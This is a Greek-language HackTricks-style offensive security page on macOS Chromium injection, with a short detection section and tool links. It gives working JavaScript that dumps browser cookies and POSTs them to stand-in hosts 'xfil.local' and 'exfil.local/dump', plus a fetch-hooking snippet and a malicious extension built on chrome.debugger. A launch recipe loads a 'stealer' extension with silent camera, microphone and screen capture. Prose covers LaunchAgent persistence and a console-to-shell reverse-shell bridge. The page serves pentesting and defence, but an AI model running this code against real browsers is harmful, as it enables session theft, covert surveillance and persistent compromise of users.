# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Οι browsers που βασίζονται στο Chromium, όπως τα Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi και Opera, χρησιμοποιούν τα ίδια command-line switches, preference files και DevTools automation interfaces. Στο macOS, οποιοσδήποτε χρήστης με GUI access μπορεί να τερματίσει μια υπάρχουσα συνεδρία του browser και να την ανοίξει ξανά με αυθαίρετα flags, extensions ή DevTools endpoints που εκτελούνται με τα entitlements του στόχου.

#### Εκκίνηση του Chromium με custom flags στο macOS

Το macOS διατηρεί ένα μόνο UI instance ανά Chromium profile, επομένως το instrumentation συνήθως απαιτεί force-closing του browser (για παράδειγμα με `osascript -e 'tell application "Google Chrome" to quit'`). Οι attackers συνήθως κάνουν relaunch μέσω `open -na "Google Chrome" --args <flags>`, ώστε να κάνουν inject arguments χωρίς να τροποποιήσουν το app bundle. Η τοποθέτηση αυτής της εντολής μέσα σε ένα user LaunchAgent (`~/Library/LaunchAgents/*.plist`) ή login hook εγγυάται ότι ο tampered browser θα γίνει respawn μετά από reboot/logoff.

#### `--load-extension` Flag

Το `--load-extension` flag φορτώνει αυτόματα unpacked extensions (διαδρομές χωρισμένες με κόμματα). Συνδύασέ το με το `--disable-extensions-except` για να μπλοκάρεις τα legitimate extensions, επιβάλλοντας την εκτέλεση μόνο του payload σου. Τα malicious extensions μπορούν να ζητήσουν permissions υψηλού αντίκτυπου, όπως `debugger`, `webRequest` και `cookies`, ώστε να κάνουν pivot σε DevTools protocols, να τροποποιούν CSP headers, να υποβαθμίζουν το HTTPS ή να κάνουν exfiltration session material μόλις ξεκινήσει ο browser.<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Αυτά τα switches εκθέτουν το Chrome DevTools Protocol (CDP) μέσω TCP ή pipe, ώστε εξωτερικά εργαλεία να μπορούν να ελέγχουν τον browser. Η Google παρατήρησε εκτεταμένη κατάχρηση infostealer αυτού του interface και, από το Chrome 136 (Μάρτιος 2025), τα switches αγνοούνται για το default profile, εκτός αν ο browser ξεκινήσει με ένα μη τυπικό `--user-data-dir`. Αυτό επιβάλλει το App-Bound Encryption σε πραγματικά profiles, όμως οι attackers μπορούν ακόμη να δημιουργήσουν ένα νέο profile, να εξαναγκάσουν το θύμα να πραγματοποιήσει authenticate μέσα σε αυτό (phishing/triage assistance) και να συλλέξουν cookies, tokens, device trust states ή WebAuthn registrations μέσω CDP.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Αυτό το flag ανακατευθύνει ολόκληρο το browser profile (History, Cookies, Login Data, Preference files κ.λπ.) σε path που ελέγχεται από τον attacker. Είναι απαραίτητο όταν συνδυάζονται σύγχρονα Chrome builds με `--remote-debugging-port` και διατηρεί επίσης το tampered profile απομονωμένο, ώστε να μπορείς να τοποθετήσεις προ-συμπληρωμένα `Preferences` ή `Secure Preferences` files που απενεργοποιούν security prompts, εγκαθιστούν extensions αυτόματα και αλλάζουν τα default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Αυτό το switch παρακάμπτει το permission prompt της κάμερας/του μικροφώνου, ώστε οποιαδήποτε σελίδα καλεί το `getUserMedia` να αποκτά αμέσως πρόσβαση. Συνδύασέ το με flags όπως `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ή CDP `Browser.grantPermissions` commands, για να κάνεις αθόρυβα capture ήχου/εικόνας, desk-share ή να ικανοποιείς WebRTC permission checks χωρίς interaction από τον χρήστη.<sup>[[4]](#references)</sup>

## Patterns παράδοσης και relaunch που έχουν παρατηρηθεί στην πράξη

Η κατάχρηση CDP αποτελεί συνήθως στάδιο **post-exploitation** και όχι το αρχικό payload. Μια πρόσφατη campaign στο macOS που στόχευε developers χρησιμοποίησε ένα poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`), ώστε ο κώδικας να εκτελείται μόνο όταν το θύμα έκανε **build** το project και όχι όταν απλώς το έκανε clone ή το άνοιγε. Μετά την πρώτη εκτέλεση, το malware μόλυνε επίσης άλλα `.xcodeproj` trees, πρόσθεσε malicious Git `pre-commit` hooks και αναζήτησε περισσότερα Xcode projects μέσα σε ZIP archives.<sup>[[3]](#references)</sup>

Για την κατάχρηση Chromium αυτό έχει σημασία, επειδή ο attacker δεν χρειάζεται να κάνει patch το ίδιο το browser binary. Ένα σύντομης διάρκειας build-phase / `osascript` stager μπορεί, αντί γι' αυτό, να εγκαταστήσει ένα **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher κ.λπ.) που ανοίγει ξανά τον legitimate browser με flags ελεγχόμενα από τον attacker κάθε φορά που ο χρήστης τον ξεκινά.<sup>[[3]](#references)</sup>

> [!TIP]
> Σε developer endpoints, έλεγξε αρχεία `.pbxproj`, `.git/hooks/pre-commit` και ZIPs που περιέχουν `.xcodeproj` για μη αναμενόμενα `curl`, `osascript`, `xxd`, nested `base64` ή Chrome relaunch logic.

## Remote Debugging και κατάχρηση DevTools Protocol

Μόλις το Chrome γίνει relaunch με dedicated `--user-data-dir` και `--remote-debugging-port`, μπορείς να συνδεθείς μέσω CDP (π.χ. μέσω `chrome-remote-interface`, `puppeteer` ή `playwright`) και να κάνεις script workflows υψηλού privilege:

- **Cookie/session theft:** Τα `Network.getAllCookies` και `Storage.getCookies` επιστρέφουν HttpOnly values, ακόμη και όταν το App-Bound encryption κανονικά θα μπλόκαρε την πρόσβαση στο filesystem, επειδή το CDP ζητά από τον browser που εκτελείται να τα κάνει decrypt.
- **Permission tampering:** Τα `Browser.grantPermissions` και `Emulation.setGeolocationOverride` επιτρέπουν την παράκαμψη camera/mic prompts (ειδικά σε συνδυασμό με το `--use-fake-ui-for-media-stream`) ή την πλαστογράφηση location-based security checks.
- **Keystroke/script injection:** Το `Runtime.evaluate` εκτελεί αυθαίρετη JavaScript μέσα στο active tab, επιτρέποντας credential lifting, DOM patching ή injection persistence beacons που επιβιώνουν από navigation.<sup>[[1]](#references)</sup>
- **Live exfiltration:** Τα `Network.webRequestWillBeSentExtraInfo` και `Fetch.enable` κάνουν intercept authenticated requests/responses σε πραγματικό χρόνο, χωρίς να αγγίζουν artifacts στον δίσκο.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Επειδή το Chrome 136 αποκλείει το CDP στο default profile, η αντιγραφή του υπάρχοντος καταλόγου `~/Library/Application Support/Google/Chrome` του θύματος σε staging path δεν επιστρέφει πλέον decrypted cookies. Αντί γι' αυτό, κάντε social-engineer τον χρήστη ώστε να πραγματοποιήσει authentication μέσα στο instrumented profile (π.χ. σε μια «βοηθητική» support session) ή καταγράψτε MFA tokens κατά τη μεταφορά τους μέσω CDP-controlled network hooks.<sup>[[5]](#references)</sup>

### Αλυσίδα CDP Backdoor τύπου XCSSET

Ένα πρακτικό malware pattern είναι:

1. Κάντε restart το userland implant ή wrapper κάθε φορά που εκκινείται το Chrome.
2. Εκκινήστε το legitimate browser με `--remote-debugging-port=<port>` και, στο Chrome 136+, συνήθως με ένα paired non-default `--user-data-dir=<dir>`.
3. Εκκινήστε έναν helper που συνδέεται στο local CDP WebSocket και καταχωρίζει ένα pre-document hook με `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Αυτός ο helper μπορεί να κάνει inject JavaScript **πριν** εκτελεστεί ο κώδικας του site, κάτι που είναι ιδανικό για hooking των `window.fetch`, `XMLHttpRequest`, wallet providers ή autofill flows, χωρίς τροποποίηση αρχείων στον δίσκο.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Μια ισχυρότερη παραλλαγή μετατρέπει τον browser σε **host command bridge**: injected JavaScript εκπέμπει ένα `console.log` με delimiter, το local helper παρακολουθεί το `Runtime.consoleAPICalled`, αφαιρεί το marker, εκτελεί το υπόλοιπο μέσω του host shell (για παράδειγμα, με το `exec.Command` της Go) και επιστρέφει τα stdout/stderr μέσω του WebSocket του attacker. Αυτό αναβαθμίζει την εκτέλεση script σε επίπεδο tab σε ένα σχεδόν fileless reverse shell.<sup>[[3]](#references)</sup>

## Injection μέσω Extension με το Debugger API

Η έρευνα του 2023 "Chrowned by an Extension" απέδειξε ότι ένα malicious extension που χρησιμοποιεί το `chrome.debugger` API μπορεί να συνδεθεί σε οποιοδήποτε tab και να αποκτήσει τις ίδιες δυνατότητες DevTools με το `--remote-debugging-port`.<sup>[[6]](#references)</sup> Αυτό καταρρίπτει τις αρχικές υποθέσεις απομόνωσης (τα extensions παραμένουν στο context τους) και επιτρέπει:

- Αθόρυβη κλοπή cookies και credentials με τα `Network.getAllCookies`/`Fetch.getResponseBody`.
- Τροποποίηση δικαιωμάτων site (camera, microphone, geolocation) και παράκαμψη security interstitial, επιτρέποντας σε phishing pages να μιμούνται διαλόγους του Chrome.
- On-path tampering προειδοποιήσεων TLS, downloads ή prompts WebAuthn μέσω προγραμματιστικού χειρισμού των `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ή `Security.handleCertificateError`.

Φορτώστε το extension με `--load-extension`/`--disable-extensions-except`, ώστε να μην απαιτείται αλληλεπίδραση από τον χρήστη. Ένα minimal background script που weaponizes το API μοιάζει ως εξής:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Η extension μπορεί επίσης να κάνει subscribe σε events `Debugger.paused` για να διαβάζει JavaScript variables, να τροποποιεί inline scripts ή να τοποθετεί custom breakpoints που παραμένουν μετά την πλοήγηση. Επειδή όλα εκτελούνται μέσα στη GUI session του χρήστη, τα Gatekeeper και TCC δεν ενεργοποιούνται, καθιστώντας αυτή την τεχνική ιδανική για malware που έχει ήδη επιτύχει execution στο context του χρήστη.<sup>[[6]](#references)</sup>

## Εντοπισμός και Hunting

- Δημιουργήστε alert για Chromium browsers που εκκινούν με `--remote-debugging-port`, `--remote-debugging-pipe` ή ύποπτο `--user-data-dir`, ιδιαίτερα όταν ο parent είναι τα `bash`, `sh`, `osascript`, `xcodebuild` ή ένας LaunchAgent helper.
- Αναζητήστε σύντομες αλυσίδες στις οποίες ένας helper ανοίγει ένα local CDP WebSocket, κάνει register το `Page.addScriptToEvaluateOnNewDocument` και στη συνέχεια δημιουργεί μια long-lived outbound WebSocket/HTTPS σύνδεση.
- Κάντε hunt για console-to-shell bridges, συσχετίζοντας activity του browser `Runtime.consoleAPICalled` με child shells ή helper processes που εκτελούν commands τα οποία παρέχονται από τον attacker.
- Σε Mac developers, ελέγξτε τα entries `PBXShellScriptBuildPhase` σε αρχεία `.pbxproj`, τα Git `pre-commit` hooks, τους Dock/login item relaunchers και τα ZIP-contained Xcode projects για εγκατάσταση browser wrapper.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Εργαλεία

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Αυτοματοποιεί την εκκίνηση του Chromium με payload extensions και εκθέτει interactive CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Παρόμοιο tooling με έμφαση στο traffic interception και το browser instrumentation για macOS operators.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js library για scripting σε dumps του Chrome DevTools Protocol (cookies, DOM, permissions), μόλις ένα instance με `--remote-debugging-port` βρίσκεται σε λειτουργία.

### Παράδειγμα
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Βρείτε περισσότερα παραδείγματα στους συνδέσμους των tools.

## Αναφορές

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
